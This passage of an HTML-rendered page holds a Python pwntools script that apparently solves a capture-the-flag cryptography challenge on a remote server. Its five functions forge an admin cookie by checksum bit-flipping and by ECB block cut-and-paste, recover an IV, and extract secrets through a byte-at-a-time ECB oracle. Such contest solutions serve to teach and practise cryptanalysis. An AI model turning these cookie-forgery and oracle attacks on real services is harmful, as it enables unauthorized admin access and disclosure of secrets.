</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span><span class=p>,</span> <span class=n>bytes_to_long</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TOKEN</span> <span class=o>=</span> <span class=s2>&#34;icq3f18237ca27013a7969864ab40836&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;139.224.254.172&#34;</span><span class=p>,</span> <span class=mi>7777</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PoW</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>proof_of_work</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>rec</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;?=&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>prefix</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\(([a-zA-Z0-9]</span><span class=si>{8}</span><span class=s2>)\+&#34;</span><span class=p>,</span> <span class=n>rec</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>answer</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>hashresult</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>prefix</span><span class=o>+</span><span class=n>answer</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>j</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>hashresult</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>bits</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;0&#39;</span><span class=o>*</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>answer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>answer</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>proof_of_work</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;teamtoken=&#34;</span><span class=p>,</span> <span class=n>TOKEN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>x</span><span class=o>^</span><span class=n>y</span> <span class=k>for</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 1</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;session=([0-9a-f].*?);&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>checksum</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;checksum=([0-9a-f].*?)\n&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;session: </span><span class=si>{</span><span class=n>session</span><span class=si>}</span><span class=se>\n</span><span class=s2>checksum: </span><span class=si>{</span><span class=n>checksum</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>checksum</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>checksum</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>raw_data</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;session=</span><span class=si>{</span><span class=n>session</span><span class=si>}</span><span class=s2>;admin=0&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>target_data</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;session=</span><span class=si>{</span><span class=n>session</span><span class=si>}</span><span class=s2>;admin=1&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>nex_checksum</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>checksum</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>15</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>target_data</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;;&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;checksum=&#34;</span> <span class=o>+</span> <span class=n>nex_checksum</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;cookie:&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 2</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>hexdigest</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()[</span><span class=mi>15</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Challenge2 sha256(iv): </span><span class=si>{</span><span class=n>hexdigest</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># r.sendlineafter(b&#34;your choice:&#34;, b&#34;1&#34;) # server decrypt for us</span>
</span></span><span class=line><span class=cl>    <span class=c1># c = b&#34;11&#34;*32</span>
</span></span><span class=line><span class=cl>    <span class=c1># r.sendlineafter(b&#34;c:&#34;, c)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># decrypt = bytes.fromhex(r.recvline()[4:-1].decode())</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(decrypt))</span>
</span></span><span class=line><span class=cl>    <span class=c1># plain1, plain2 = decrypt[:16], decrypt[16:32]</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(plain1.hex(), plain2.hex())</span>
</span></span><span class=line><span class=cl>    <span class=c1># xor_vector = xor(b&#34;11&#34;*16, plain2)</span>
</span></span><span class=line><span class=cl>    <span class=c1># iv = xor(xor_vector, plain1)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(iv) # b&#39;\x8c t\xeb\x83\xfb\x1c\xac\xfa\xa4hk{\xbe\xcf|&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x8c</span><span class=s1> t</span><span class=se>\xeb\x83\xfb\x1c\xac\xfa\xa4</span><span class=s1>hk{</span><span class=se>\xbe\xcf</span><span class=s1>|&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Challenge2 IV: </span><span class=si>{</span><span class=n>iv</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Challenge2 sha256(IV): </span><span class=si>{</span><span class=n>sha256</span><span class=p>(</span><span class=n>iv</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span> <span class=c1># guess iv</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;iv(encode hex):&#34;</span><span class=p>,</span> <span class=n>iv</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 3</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;128bit_ecb_encrypt(cookie):&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>    <span class=c1># session:e8766bf7</span>
</span></span><span class=line><span class=cl>    <span class=n>c2</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span>  <span class=c1># ;timedl=1;admin=</span>
</span></span><span class=line><span class=cl>    <span class=n>c3</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>32</span><span class=p>:</span><span class=mi>48</span><span class=p>]</span>  <span class=c1># 0;guess_cookie_m</span>
</span></span><span class=line><span class=cl>    <span class=n>c4</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>48</span><span class=p>:</span><span class=mi>64</span><span class=p>]</span>  <span class=c1># a=1;guess_mp_ab=</span>
</span></span><span class=line><span class=cl>    <span class=n>c5</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>64</span><span class=p>:</span><span class=mi>80</span><span class=p>]</span>  <span class=c1># 1;guess_cookie_m</span>
</span></span><span class=line><span class=cl>    <span class=n>c6</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>80</span><span class=p>:</span><span class=mi>96</span><span class=p>]</span>  <span class=c1># b=0;hell_pad=233</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>c1</span> <span class=o>+</span> <span class=n>c2</span> <span class=o>+</span> <span class=n>c5</span> <span class=o>+</span> <span class=n>c4</span> <span class=o>+</span> <span class=n>c5</span> <span class=o>+</span> <span class=n>c6</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;input your encrypted cookie(encode hex):&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_4</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 4</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>secret</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;i</span><span class=se>\x87</span><span class=s2>Z</span><span class=se>\x02</span><span class=s2>9</span><span class=se>\x94\x90\xaa</span><span class=s2>gr</span><span class=se>\x18</span><span class=s2>&lt;m*</span><span class=se>\x81\x0f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>secret</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>inp</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=o>*</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;input(encode hex):&#34;</span><span class=p>,</span> <span class=n>inp</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;before encrypted:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;encrypted msg: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[:</span><span class=mi>32</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;cipher: </span><span class=si>{</span><span class=n>cipher</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;input(encode hex):&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>inp</span> <span class=o>+</span> <span class=n>secret</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>j</span><span class=p>]))</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;encrypted msg: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[:</span><span class=mi>32</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;c: </span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cipher</span> <span class=ow>in</span> <span class=n>c</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>secret</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span> <span class=c1># secert</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;secret&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_5</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 5</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># hexdigest = &#34;deb36c8f64034db192a896fb067f381240a1edd776c07f31b1bef33ec3998e6e&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># encrypt_secret = &#34;75b1c0ebc5dfcabe784ea85ee2a28a52&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># table = dict()</span>
</span></span><span class=line><span class=cl>    <span class=c1># for i in range(0, 256**2, 256):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     payload = &#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     for j in range(i, i+256):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#         payload += hex(j)[2:].zfill(4)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     r.sendlineafter(b&#34;your choice:&#34;, b&#34;1&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     r.sendlineafter(b&#34;input(encode hex):&#34;, payload.encode())</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     r.recvuntil(b&#39;myblockencrypt_ecb(your_input).encode(&#34;hex&#34;):&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     cipher = r.recvline().strip().decode()</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     for k, j in enumerate(range(i, i+256)):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#         table[cipher[k*4:k*4+4]] = hex(j)[2:].zfill(4)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     print(i)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># for i in range(0, len(encrypt_secret), 4):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     secret += table[encrypt_secret[i:i+4]]</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(secret)</span>
</span></span><span class=line><span class=cl>    <span class=n>secret</span> <span class=o>=</span> <span class=s1>&#39;cdf3ff86aeb04a7fdb1614043964349c&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span> <span class=c1># secert</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;secret&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
